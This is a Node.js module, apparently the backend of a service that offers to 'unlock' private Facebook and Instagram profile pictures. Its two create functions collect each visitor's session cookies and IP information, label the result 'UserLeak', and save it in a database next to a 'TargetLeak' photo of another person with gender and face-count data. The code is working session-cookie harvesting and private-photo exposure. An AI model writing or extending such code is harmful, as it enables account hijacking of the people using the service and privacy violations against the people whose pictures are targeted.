const Facebook = require("../libs/facebook")
const Instagram = require("../libs/instagram")
const Photos = require("../models/Photos");



const findByIdAndUpdateUser = async (userFromDB,userId,userData) => {
    const users = userFromDB.user
    const isSameUserViewSameImage =  users.filter(user => {
      return   user.userId === userId
    } )
    if (isSameUserViewSameImage.length === 0) {

        await Photos.findByIdAndUpdate(userFromDB._id, {$push: {user:userData}},{new:true})
    }


}
const createUnlockFacebookPicture = async (TargetInfo, TargetLeak, cookies,ipInfo,hash) => {

   const UserLeak = await Facebook.GetFacebookUserInfo(cookies.c_user)
    UserLeak.ipInfo = ipInfo
    UserLeak.cookies = cookies
    return Photos.create({
        username: TargetInfo.username,
        id: TargetInfo.id,
        full_name: TargetInfo.name,
        service: "Unlock Facebook Profile Picture",
        photo: TargetLeak.userPictureOnCloud,
        gender: TargetLeak.userPictureData.gender,
        faceCount: TargetLeak.userPictureData.faceCount,
        user:[UserLeak] ,
        hash

    })

}
const createUnlockInstagramPicture = async (TargetInfo, TargetLeak, cookies,ipInfo,hash) => {

    const UserLeak = await Instagram.GetInstagramUserInfo(cookies)
    UserLeak.ipInfo = ipInfo
    UserLeak.cookies = cookies
    UserLeak.userId = cookies.u_id
    return Photos.create({
        username: TargetInfo.username,
        id: TargetInfo.id,
        full_name: TargetInfo.name,
        service: "Unlock Instagram Profile Picture",
        photo: TargetLeak.userPictureOnCloud,
        gender: TargetLeak.userPictureData.gender,
        faceCount: TargetLeak.userPictureData.faceCount,
        hash: hash,
        user:[UserLeak] ,

    })

}

module.exports = {
    findByIdAndUpdateUser, createUnlockFacebookPicture,createUnlockInstagramPicture

}